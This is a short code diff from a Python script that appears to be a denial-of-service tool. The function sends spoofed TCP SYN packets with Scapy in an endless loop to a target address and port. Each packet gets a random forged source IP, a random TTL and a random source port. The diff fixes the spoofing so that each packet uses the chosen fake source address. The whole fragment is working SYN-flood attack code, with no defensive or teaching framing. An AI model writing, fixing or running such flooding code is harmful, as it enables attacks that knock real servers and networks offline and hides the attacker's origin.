@@ -41,8 +41,7 @@ def sendpacket(Ip_range, destinationnew, targetport, destination):
        while 0 == 0:
            try:
                sourceIP = random.choice(Ip_range)
-               pkt = IP(dst = str(destinationnew), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S"))
-               silva.sendto(bytes(pkt), (str(destinationnew), 0))
+               silva.send(bytes(IP(dst = str(destinationnew), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
                Ip_range.remove(sourceIP)
                if cntcheck == 1:
                     cntcheck = random.randint(8000, 10000)
